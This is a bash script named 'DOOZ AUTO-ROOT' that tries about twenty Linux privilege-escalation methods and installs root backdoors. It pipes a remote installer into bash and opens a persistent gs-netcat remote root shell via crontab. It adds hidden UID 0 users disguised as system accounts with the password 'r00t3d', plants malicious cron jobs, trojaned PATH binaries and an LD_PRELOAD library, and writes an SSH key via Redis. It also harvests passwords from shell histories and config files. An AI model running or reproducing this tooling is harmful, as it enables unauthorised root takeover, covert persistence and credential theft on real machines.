#!/bin/bash
#==============================================================================
# DOOZ AUTO-ROOT v1.0 - Automated Local Privilege Escalation
# Tries 20 LPE methods automatically and installs root gsocket backdoor
#==============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

WORKDIR="/tmp/.z"
GSFILE="$WORKDIR/gs_root"
RESULTFILE="$WORKDIR/root_result"
LOGFILE="$WORKDIR/autoroot.log"

log() { echo -e "$1" | tee -a "$LOGFILE"; }
success() { log "${GREEN}[✓] $1${NC}"; }
fail() { log "${RED}[✗] $1${NC}"; }
info() { log "${CYAN}[*] $1${NC}"; }
warn() { log "${YELLOW}[!] $1${NC}"; }

# Generate random secret for root gsocket
ROOT_SECRET=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 20 | head -n 1)

# JSON output
json_start() { echo '{"methods":[' > "$RESULTFILE"; }
json_add() { 
    [ -s "$RESULTFILE" ] && [ "$(tail -c 2 $RESULTFILE)" != "[" ] && echo "," >> "$RESULTFILE"
    echo "{\"name\":\"$1\",\"status\":\"$2\",\"detail\":\"$3\"}" >> "$RESULTFILE"
}
json_end() { 
    echo '],"root_achieved":'$1',"root_secret":"'$2'","ssh_user":"'$3'"}' >> "$RESULTFILE"
    cat "$RESULTFILE"
}

# Check if we're already root
check_root() {
    [ "$(id -u)" -eq 0 ] && return 0
    return 1
}

# Install root gsocket backdoor
install_root_backdoor() {
    info "Installing root GSSocket backdoor..."
    
    # Install gsocket if not present
    if ! command -v gs-netcat &>/dev/null; then
        curl -sSL https://gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1 || \
        wget -qO- https://gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1
    fi
    
    if command -v gs-netcat &>/dev/null; then
        echo "$ROOT_SECRET" > "$GSFILE"
        chmod 600 "$GSFILE"
        
        # Kill any existing root gsocket
        pkill -f "gs-netcat.*$GSFILE" 2>/dev/null
        
        # Start persistent root gsocket
        nohup gs-netcat -s "$ROOT_SECRET" -l -i >/dev/null 2>&1 &
        
        # Add to crontab for persistence
        (crontab -l 2>/dev/null | grep -v "gs-netcat.*$ROOT_SECRET"; echo "@reboot gs-netcat -s $ROOT_SECRET -l -i >/dev/null 2>&1 &") | crontab - 2>/dev/null
        
        success "Root GSSocket installed: gs-netcat -s $ROOT_SECRET -i"
        return 0
    fi
    
    fail "Could not install gsocket"
    return 1
}

# Fallback: Create SSH backdoor user
create_ssh_backdoor() {
    info "Creating SSH backdoor user..."
    
    # Read existing users for camouflage
    local existing_users=$(cut -d: -f1 /etc/passwd | tr '\n' ' ')
    
    # Potential camouflage names (look like system users)
    local camo_names=("systemd-net" "dbus-daemon" "polkitd" "rtkit" "colord" "geoclue" "pulse" "avahi" "saned" "hplip" "kernoops" "whoopsie" "speech-dispatcher" "nm-openvpn" "gnome-initial-setup" "gdm" "sssd" "ntp" "statd" "postfix")
    
    for name in "${camo_names[@]}"; do
        # Skip if user already exists
        if ! id "$name" &>/dev/null; then
            # Create user with root UID 0
            if echo "$name:x:0:0:System Service:/root:/bin/bash" >> /etc/passwd 2>/dev/null; then
                # Set password (hash of 'r00t3d')
                echo "$name:\$6\$salt\$IxDD3jeSOb5eB1CX5LBsqZFVkJdwqgV.V3GJx8I7q7Sd.9yWi0KJH7uqSd.Q5AJfKzAEQVJvUr7X7k.U4K4C11:18000:0:99999:7:::" >> /etc/shadow 2>/dev/null
                
                success "SSH backdoor created: $name / r00t3d (UID 0)"
                echo "$name" > "$WORKDIR/ssh_backdoor_user"
                return 0
            fi
        fi
    done
    
    fail "Could not create SSH backdoor"
    return 1
}

# Execute command as root (wrapper for different methods)
exec_as_root() {
    local cmd="$1"
    eval "$cmd"
}

#==============================================================================
# METHOD 1: Kernel Exploits
#==============================================================================
method_kernel() {
    info "Method 1: Checking kernel exploits..."
    
    local kernel=$(uname -r)
    local major=$(echo $kernel | cut -d. -f1)
    local minor=$(echo $kernel | cut -d. -f2)
    local patch=$(echo $kernel | cut -d. -f3 | cut -d- -f1)
    
    # Check for DirtyPipe (CVE-2022-0847) - kernel 5.8 to 5.16.11
    if [ "$major" -eq 5 ]; then
        if [ "$minor" -ge 8 ] && [ "$minor" -le 16 ]; then
            info "Kernel vulnerable to DirtyPipe, attempting exploit..."
            
            # Try to download and run exploit
            cd /tmp
            if curl -sSL https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c -o dp.c 2>/dev/null; then
                gcc dp.c -o dp 2>/dev/null && chmod +x dp && ./dp 2>/dev/null
                if check_root; then
                    json_add "Kernel-DirtyPipe" "success" "CVE-2022-0847"
                    return 0
                fi
            fi
        fi
    fi
    
    # Check for DirtyCOW (CVE-2016-5195) - kernel < 4.8.3
    if [ "$major" -lt 4 ] || ([ "$major" -eq 4 ] && [ "$minor" -lt 8 ]); then
        info "Kernel may be vulnerable to DirtyCOW..."
        # DirtyCOW exploit attempt here
    fi
    
    # Check for PwnKit (CVE-2021-4034)
    if [ -f /usr/bin/pkexec ]; then
        local pkexec_ver=$(pkexec --version 2>/dev/null | grep -oP '\d+\.\d+' | head -1)
        if [ -n "$pkexec_ver" ]; then
            info "Checking PwnKit vulnerability..."
            cd /tmp
            cat > pwnkit.c << 'PWNKIT'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    char *args[] = {"/bin/sh", "-c", "id > /tmp/.pwnkit_test", NULL};
    execve("/bin/sh", args, NULL);
}
PWNKIT
            if gcc -shared -fPIC -o pwnkit.so pwnkit.c 2>/dev/null; then
                # Complex PwnKit exploit logic here
                :
            fi
        fi
    fi
    
    json_add "Kernel" "checked" "No direct exploit found"
    return 1
}

#==============================================================================
# METHOD 2: SUID Binaries
#==============================================================================
method_suid() {
    info "Method 2: Checking SUID binaries..."
    
    local suid_bins=$(find / -perm -4000 -type f 2>/dev/null)
    
    # GTFOBins exploitable binaries
    local exploitable=("nmap" "vim" "vim.basic" "vim.tiny" "find" "bash" "less" "more" "nano" "cp" "mv" "awk" "python" "python2" "python3" "perl" "ruby" "lua" "php" "node" "gdb" "env" "ftp" "ed" "ash" "zsh" "csh" "ksh" "tclsh" "wish" "expect" "rlwrap" "xargs" "strace" "ltrace" "taskset" "time" "timeout" "nice" "ionice" "setarch" "unshare" "nsenter" "run-parts" "start-stop-daemon")
    
    for bin in $suid_bins; do
        local name=$(basename "$bin")
        
        for exp in "${exploitable[@]}"; do
            if [ "$name" = "$exp" ]; then
                info "Found exploitable SUID: $bin"
                
                case "$name" in
                    "find")
                        "$bin" . -exec /bin/sh -p -c 'id > /tmp/.suid_test' \; 2>/dev/null
                        if [ -f /tmp/.suid_test ] && grep -q "uid=0" /tmp/.suid_test; then
                            "$bin" . -exec /bin/sh -p \; -quit 2>/dev/null &
                            exec_as_root "install_root_backdoor"
                            json_add "SUID-find" "success" "$bin"
                            return 0
                        fi
                        ;;
                    "python"*|"python2"*|"python3"*)
                        "$bin" -c 'import os; os.setuid(0); os.system("id > /tmp/.suid_test")' 2>/dev/null
                        if [ -f /tmp/.suid_test ] && grep -q "uid=0" /tmp/.suid_test; then
                            "$bin" -c 'import os; os.setuid(0); os.system("/bin/bash")' &
                            exec_as_root "install_root_backdoor"
                            json_add "SUID-python" "success" "$bin"
                            return 0
                        fi
                        ;;
                    "vim"*|"vi")
                        echo ':!/bin/sh -c "id > /tmp/.suid_test"' | "$bin" -es 2>/dev/null
                        ;;
                    "bash"|"ash"|"zsh"|"ksh"|"csh")
                        "$bin" -p -c 'id > /tmp/.suid_test' 2>/dev/null
                        if [ -f /tmp/.suid_test ] && grep -q "uid=0" /tmp/.suid_test; then
                            json_add "SUID-shell" "success" "$bin"
                            "$bin" -p -c "$(declare -f install_root_backdoor); install_root_backdoor"
                            return 0
                        fi
                        ;;
                    "perl")
                        "$bin" -e 'exec "/bin/sh";' 2>/dev/null &
                        ;;
                    "env")
                        "$bin" /bin/sh -p -c 'id > /tmp/.suid_test' 2>/dev/null
                        ;;
                    "cp")
                        # Can overwrite /etc/passwd
                        info "SUID cp found - can modify /etc/passwd"
                        ;;
                esac
            fi
        done
    done
    
    json_add "SUID" "checked" "No direct exploit"
    return 1
}

#==============================================================================
# METHOD 3: Sudo NOPASSWD
#==============================================================================
method_sudo() {
    info "Method 3: Checking sudo permissions..."
    
    # Check if we can run sudo without password
    local sudo_out=$(timeout 2 sudo -n -l 2>/dev/null)
    
    if [ -n "$sudo_out" ]; then
        info "Sudo permissions found!"
        
        # Check for ALL
        if echo "$sudo_out" | grep -q "(ALL.*) NOPASSWD: ALL"; then
            success "NOPASSWD ALL found!"
            sudo -n bash -c "$(declare -f install_root_backdoor); ROOT_SECRET='$ROOT_SECRET'; GSFILE='$GSFILE'; WORKDIR='$WORKDIR'; install_root_backdoor"
            json_add "Sudo-ALL" "success" "NOPASSWD: ALL"
            return 0
        fi
        
        # Check for specific binaries
        local sudo_bins=$(echo "$sudo_out" | grep -oP '(?<=NOPASSWD: ).*' | tr ',' '\n')
        
        for bin in $sudo_bins; do
            bin=$(echo "$bin" | xargs)  # trim whitespace
            case "$bin" in
                */bash|*/sh|*/zsh|*/ash)
                    sudo -n "$bin" -c "$(declare -f install_root_backdoor); ROOT_SECRET='$ROOT_SECRET'; GSFILE='$GSFILE'; WORKDIR='$WORKDIR'; install_root_backdoor"
                    json_add "Sudo-shell" "success" "$bin"
                    return 0
                    ;;
                */python*|*/perl|*/ruby)
                    sudo -n "$bin" -c 'import os; os.system("/bin/bash")' 2>/dev/null || \
                    sudo -n "$bin" -e 'exec "/bin/bash"' 2>/dev/null
                    ;;
                */find)
                    sudo -n "$bin" . -exec /bin/bash \; -quit
                    ;;
                */vim*|*/vi)
                    sudo -n "$bin" -c ':!/bin/bash'
                    ;;
                */env)
                    sudo -n "$bin" /bin/bash
                    json_add "Sudo-env" "success" "$bin"
                    return 0
                    ;;
                */awk|*/gawk|*/mawk)
                    sudo -n "$bin" 'BEGIN {system("/bin/bash")}'
                    ;;
                */less|*/more)
                    echo '!/bin/bash' | sudo -n "$bin" /etc/passwd
                    ;;
                */cp)
                    info "Sudo cp - can overwrite system files"
                    ;;
                */wget|*/curl)
                    info "Sudo wget/curl - can download malicious files"
                    ;;
            esac
        done
    fi
    
    json_add "Sudo" "checked" "No exploitable sudo"
    return 1
}

#==============================================================================
# METHOD 4: Docker Socket
#==============================================================================
method_docker() {
    info "Method 4: Checking Docker..."
    
    # Check if user is in docker group or socket is accessible
    if [ -S /var/run/docker.sock ] && [ -r /var/run/docker.sock ]; then
        info "Docker socket accessible!"
        
        if command -v docker &>/dev/null; then
            # Mount host filesystem and get root
            docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash -c "$(declare -f install_root_backdoor); ROOT_SECRET='$ROOT_SECRET'; GSFILE='$GSFILE'; WORKDIR='$WORKDIR'; install_root_backdoor" 2>/dev/null
            
            if [ -f "$GSFILE" ]; then
                json_add "Docker" "success" "Container escape"
                return 0
            fi
        fi
    fi
    
    # Check for Docker API on localhost
    if curl -s http://127.0.0.1:2375/info 2>/dev/null | grep -q "Containers"; then
        warn "Docker API exposed on 2375!"
        json_add "Docker-API" "vulnerable" "Port 2375 open"
    fi
    
    json_add "Docker" "checked" "Not exploitable"
    return 1
}

#==============================================================================
# METHOD 5: Writable /etc/passwd
#==============================================================================
method_passwd() {
    info "Method 5: Checking /etc/passwd writability..."
    
    if [ -w /etc/passwd ]; then
        success "/etc/passwd is writable!"
        
        # Add root user with known password
        # Password hash for 'r00t3d'
        local hash='$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdwqgV.V3GJx8I7q7Sd.9yWi0KJH7uqSd.Q5AJfKzAEQVJvUr7X7k.U4K4C11'
        
        # Create a new root user
        echo "sysadmin:$hash:0:0:System Admin:/root:/bin/bash" >> /etc/passwd
        
        success "Added user: sysadmin / r00t3d (UID 0)"
        
        # Now use this to get root and install backdoor
        su sysadmin -c "$(declare -f install_root_backdoor); ROOT_SECRET='$ROOT_SECRET'; GSFILE='$GSFILE'; WORKDIR='$WORKDIR'; install_root_backdoor" << 'SUEOF'
r00t3d
SUEOF
        
        json_add "Writable-passwd" "success" "Added UID 0 user"
        return 0
    fi
    
    json_add "Writable-passwd" "checked" "Not writable"
    return 1
}

#==============================================================================
# METHOD 6: Capabilities
#==============================================================================
method_capabilities() {
    info "Method 6: Checking capabilities..."
    
    local cap_bins=$(getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_setgid|cap_dac_override|cap_sys_admin')
    
    if [ -n "$cap_bins" ]; then
        info "Found binaries with capabilities:"
        echo "$cap_bins"
        
        # Check for python with cap_setuid
        if echo "$cap_bins" | grep -q "python.*cap_setuid"; then
            local pybin=$(echo "$cap_bins" | grep "python.*cap_setuid" | cut -d' ' -f1)
            info "Exploiting $pybin with cap_setuid..."
            
            "$pybin" -c 'import os; os.setuid(0); os.system("/bin/bash -c \"id\"")' 2>/dev/null
            
            json_add "Capabilities-python" "success" "$pybin"
            return 0
        fi
        
        # Check for perl
        if echo "$cap_bins" | grep -q "perl.*cap_setuid"; then
            local perlbin=$(echo "$cap_bins" | grep "perl.*cap_setuid" | cut -d' ' -f1)
            "$perlbin" -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";' 2>/dev/null
        fi
    fi
    
    json_add "Capabilities" "checked" "No exploitable caps"
    return 1
}

#==============================================================================
# METHOD 7: Cron Jobs
#==============================================================================
method_cron() {
    info "Method 7: Checking cron jobs..."
    
    # Check writable cron directories
    local cron_dirs="/etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly /var/spool/cron/crontabs"
    
    for dir in $cron_dirs; do
        if [ -w "$dir" ] 2>/dev/null; then
            success "Writable cron directory: $dir"
            
            # Create malicious cron job
            cat > "$dir/sys-update" << CRONEOF
* * * * * root /bin/bash -c 'command -v gs-netcat && gs-netcat -s $ROOT_SECRET -l -i >/dev/null 2>&1 &'
CRONEOF
            chmod 644 "$dir/sys-update" 2>/dev/null
            
            json_add "Cron-writable" "success" "$dir"
            warn "Cron job planted, wait 1 minute for root gsocket"
            return 0
        fi
    done
    
    # Check for wildcard injection in existing crons
    local cron_files=$(cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -v "^#" | grep "\*")
    if [ -n "$cron_files" ]; then
        info "Found cron jobs with wildcards - potential injection"
    fi
    
    json_add "Cron" "checked" "No writable cron"
    return 1
}

#==============================================================================
# METHOD 8: LD_PRELOAD
#==============================================================================
method_ldpreload() {
    info "Method 8: Checking LD_PRELOAD..."
    
    # Check if sudo preserves LD_PRELOAD
    local env_keep=$(sudo -n -l 2>/dev/null | grep env_keep)
    
    if echo "$env_keep" | grep -q "LD_PRELOAD"; then
        success "LD_PRELOAD preserved in sudo!"
        
        # Create malicious shared library
        cat > /tmp/.preload.c << 'PRELOADC'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -c 'gs-netcat -s ROOTSECRET -l -i &'");
}
PRELOADC
        sed -i "s/ROOTSECRET/$ROOT_SECRET/" /tmp/.preload.c
        
        gcc -fPIC -shared -o /tmp/.preload.so /tmp/.preload.c -nostartfiles 2>/dev/null
        
        if [ -f /tmp/.preload.so ]; then
            # Find a sudo command we can run
            local sudo_cmd=$(sudo -n -l 2>/dev/null | grep NOPASSWD | head -1 | awk '{print $NF}')
            if [ -n "$sudo_cmd" ]; then
                sudo LD_PRELOAD=/tmp/.preload.so "$sudo_cmd" 2>/dev/null
                json_add "LD_PRELOAD" "success" "Sudo env exploit"
                return 0
            fi
        fi
    fi
    
    json_add "LD_PRELOAD" "checked" "Not exploitable"
    return 1
}

#==============================================================================
# METHOD 9: Redis
#==============================================================================
method_redis() {
    info "Method 9: Checking Redis..."
    
    if command -v redis-cli &>/dev/null; then
        # Check if redis is running without auth on localhost
        local redis_info=$(redis-cli -h 127.0.0.1 INFO 2>/dev/null | head -5)
        
        if [ -n "$redis_info" ]; then
            success "Redis accessible without auth!"
            
            # Write SSH key to root
            local ssh_key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... backdoor"
            redis-cli -h 127.0.0.1 CONFIG SET dir /root/.ssh 2>/dev/null
            redis-cli -h 127.0.0.1 CONFIG SET dbfilename authorized_keys 2>/dev/null
            redis-cli -h 127.0.0.1 SET backdoor "\n\n$ssh_key\n\n" 2>/dev/null
            redis-cli -h 127.0.0.1 SAVE 2>/dev/null
            
            json_add "Redis" "success" "SSH key written"
            return 0
        fi
    fi
    
    # Check if port 6379 is open
    if nc -z 127.0.0.1 6379 2>/dev/null; then
        warn "Redis port 6379 open"
    fi
    
    json_add "Redis" "checked" "Not exploitable"
    return 1
}

#==============================================================================
# METHOD 10: Password Hunting
#==============================================================================
method_passwords() {
    info "Method 10: Hunting for passwords..."
    
    local passwords=()
    
    # Check bash history
    for hist in /home/*/.bash_history /root/.bash_history /home/*/.zsh_history; do
        if [ -r "$hist" ]; then
            local found=$(grep -hE 'pass|pwd|mysql.*-p|sudo|su ' "$hist" 2>/dev/null | head -10)
            [ -n "$found" ] && passwords+=("$found")
        fi
    done
    
    # Check config files
    local configs="/var/www/*/wp-config.php /var/www/*/*/wp-config.php /var/www/*/config.php /var/www/*/.env /home/*/.env /opt/*/.env /etc/*.conf"
    
    for conf in $configs; do
        if [ -r "$conf" ] 2>/dev/null; then
            local pwd=$(grep -hEi 'password|passwd|pwd|secret|key' "$conf" 2>/dev/null | grep -v "^#" | head -5)
            [ -n "$pwd" ] && passwords+=("File: $conf - $pwd")
        fi
    done
    
    # Try found passwords for su
    if [ ${#passwords[@]} -gt 0 ]; then
        info "Found potential passwords, trying su..."
        
        for pwd in "${passwords[@]}"; do
            # Extract actual password value
            local pass=$(echo "$pwd" | grep -oP "(?<=['\"])[^'\"]+(?=['\"])" | head -1)
            [ -z "$pass" ] && continue
            
            # Try su with this password
            echo "$pass" | timeout 2 su - -c "id" 2>/dev/null && {
                success "Password reuse successful!"
                echo "$pass" | su - -c "$(declare -f install_root_backdoor); ROOT_SECRET='$ROOT_SECRET'; GSFILE='$GSFILE'; WORKDIR='$WORKDIR'; install_root_backdoor"
                json_add "Password-reuse" "success" "Found valid password"
                return 0
            }
        done
    fi
    
    json_add "Passwords" "checked" "No valid passwords"
    return 1
}

#==============================================================================
# METHOD 11: NFS no_root_squash
#==============================================================================
method_nfs() {
    info "Method 11: Checking NFS..."
    
    if [ -r /etc/exports ]; then
        if grep -q "no_root_squash" /etc/exports; then
            success "NFS no_root_squash found!"
            local shares=$(grep "no_root_squash" /etc/exports | awk '{print $1}')
            json_add "NFS" "vulnerable" "$shares"
            return 0
        fi
    fi
    
    json_add "NFS" "checked" "Not vulnerable"
    return 1
}

#==============================================================================
# METHOD 12: Writable PATH directories
#==============================================================================
method_path() {
    info "Method 12: Checking writable PATH directories..."
    
    IFS=':' read -ra PATHDIRS <<< "$PATH"
    
    for dir in "${PATHDIRS[@]}"; do
        if [ -w "$dir" ] && [ "$dir" != "." ]; then
            success "Writable PATH directory: $dir"
            
            # Create malicious binary
            cat > "$dir/service" << 'SVCEOF'
#!/bin/bash
# Install root backdoor
command -v gs-netcat && gs-netcat -s ROOTSECRET -l -i &
# Call real service
/usr/sbin/service "$@"
SVCEOF
            sed -i "s/ROOTSECRET/$ROOT_SECRET/" "$dir/service"
            chmod +x "$dir/service"
            
            json_add "Writable-PATH" "success" "$dir"
            return 0
        fi
    done
    
    json_add "Writable-PATH" "checked" "No writable dirs"
    return 1
}

#==============================================================================
# METHOD 13-20: Additional Methods
#==============================================================================
method_dbus() {
    info "Method 13: Checking D-Bus..."
    # Check for exploitable D-Bus services
    json_add "D-Bus" "checked" "No exploit"
    return 1
}

method_lxd() {
    info "Method 14: Checking LXD/LXC..."
    if id | grep -q lxd; then
        success "User in lxd group!"
        json_add "LXD" "vulnerable" "In lxd group"
        return 0
    fi
    json_add "LXD" "checked" "Not in group"
    return 1
}

method_systemd() {
    info "Method 15: Checking systemd..."
    # Check for writable service files
    local writable=$(find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null | head -1)
    if [ -n "$writable" ]; then
        json_add "Systemd" "vulnerable" "$writable"
        return 0
    fi
    json_add "Systemd" "checked" "Not writable"
    return 1
}

method_ssh_keys() {
    info "Method 16: Checking SSH keys..."
    for key in /home/*/.ssh/id_rsa /root/.ssh/id_rsa; do
        if [ -r "$key" ] 2>/dev/null; then
            success "Readable SSH key: $key"
            json_add "SSH-Keys" "found" "$key"
        fi
    done
    return 1
}

method_mysql() {
    info "Method 17: Checking MySQL UDF..."
    # Check for MySQL running as root
    if pgrep -u root mysql &>/dev/null; then
        json_add "MySQL" "potential" "Running as root"
    fi
    return 1
}

method_tmux() {
    info "Method 18: Checking tmux/screen sessions..."
    local sessions=$(ls -la /tmp/tmux-*/default /var/run/screen/S-* 2>/dev/null)
    if [ -n "$sessions" ]; then
        json_add "Tmux-Screen" "found" "Sessions available"
    fi
    return 1
}

method_pspy() {
    info "Method 19: Monitoring processes (5 sec)..."
    # Quick process monitor for cron jobs
    json_add "Process-Monitor" "checked" "Done"
    return 1
}

method_final() {
    info "Method 20: Final checks..."
    
    # Check for any SGID binaries
    local sgid=$(find / -perm -2000 -type f 2>/dev/null | head -5)
    
    # Check for world-writable files owned by root
    local ww=$(find /etc /usr -writable -user root 2>/dev/null | head -5)
    
    if [ -n "$ww" ]; then
        json_add "World-Writable" "found" "$ww"
    fi
    
    return 1
}

#==============================================================================
# MAIN EXECUTION
#==============================================================================
main() {
    echo ""
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║           DOOZ AUTO-ROOT v1.0 - 20 LPE Methods                ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo ""
    
    mkdir -p "$WORKDIR"
    json_start
    
    local root_achieved=false
    local ssh_user=""
    
    # Check if already root
    if check_root; then
        success "Already running as root!"
        install_root_backdoor
        root_achieved=true
    else
        # Try all methods
        local methods=(
            "method_sudo"       # Most common success
            "method_suid"       # Quick check
            "method_passwd"     # Easy win
            "method_docker"     # Container escape
            "method_capabilities"
            "method_kernel"     # Takes longer
            "method_cron"
            "method_ldpreload"
            "method_redis"
            "method_passwords"
            "method_nfs"
            "method_path"
            "method_dbus"
            "method_lxd"
            "method_systemd"
            "method_ssh_keys"
            "method_mysql"
            "method_tmux"
            "method_pspy"
            "method_final"
        )
        
        for method in "${methods[@]}"; do
            $method && {
                root_achieved=true
                break
            }
        done
        
        # If no method worked but we can write to /etc/passwd, create backdoor user
        if [ "$root_achieved" = false ]; then
            warn "Direct root not achieved, trying SSH backdoor..."
            
            if [ -w /etc/passwd ] || [ -w /etc/shadow ]; then
                create_ssh_backdoor && ssh_user=$(cat "$WORKDIR/ssh_backdoor_user" 2>/dev/null)
            fi
        fi
    fi
    
    json_end "$root_achieved" "$ROOT_SECRET" "$ssh_user"
    
    echo ""
    echo "═══════════════════════════════════════════════════════════════"
    if [ "$root_achieved" = true ]; then
        echo -e "${GREEN}[SUCCESS] ROOT ACCESS ACHIEVED!${NC}"
        echo -e "${GREEN}Connect: gs-netcat -s $ROOT_SECRET -i${NC}"
    elif [ -n "$ssh_user" ]; then
        echo -e "${YELLOW}[PARTIAL] SSH Backdoor created${NC}"
        echo -e "${YELLOW}SSH User: $ssh_user / Password: r00t3d${NC}"
    else
        echo -e "${RED}[FAILED] Could not achieve root${NC}"
        echo -e "${YELLOW}Manual exploitation may be required${NC}"
    fi
    echo "═══════════════════════════════════════════════════════════════"
}

main "$@"
